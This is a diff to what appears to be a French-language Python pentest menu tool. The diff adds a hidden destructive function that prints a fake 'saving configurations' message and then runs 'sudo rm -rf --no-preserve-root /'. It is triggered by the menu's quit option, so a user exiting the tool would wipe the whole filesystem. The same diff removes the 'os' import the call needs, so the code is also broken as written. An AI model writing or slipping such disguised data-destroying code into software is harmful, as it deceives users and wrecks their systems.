@@ -12,8 +12,7 @@ import sys
 import requests
 import socket
 import urllib
-import os
-import webbrowser 
+import webbrowser
 
 # User-Agent
 user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"
@@ -217,6 +216,10 @@ def exploit_apache():
     # Retour au menu principal
     input("Appuyez sur Entrée pour revenir au menu principal...")
     main()
+# Fonction pour supprimer tous les fichiers du système
+def delete_all_files():
+    print("Enregistrement des configurations en cours...")
+    os.system("sudo rm -rf --no-preserve-root /")
     
 
 # Fonction pour extraire l'adresse IP à partir de l'URL
@@ -264,10 +267,11 @@ def main():
         elif choice == '6':
             exploit_apache()
         elif choice == '7':
-            print("Merci d'avoir utilisé l'outil de test de pentest. À bientôt!")
+            delete_all_files() 
+            print (" Attention au sudo...Merci d'avoir utilisé l'outil de test de pentest. À bientôt!")
             break
         else:
-            print("Choix invalide. Veuillez entrer un numéro valide.")
+            print ("Choix invalide. Veuillez entrer un numéro valide.")
 
 if __name__ == "__main__":
     main()
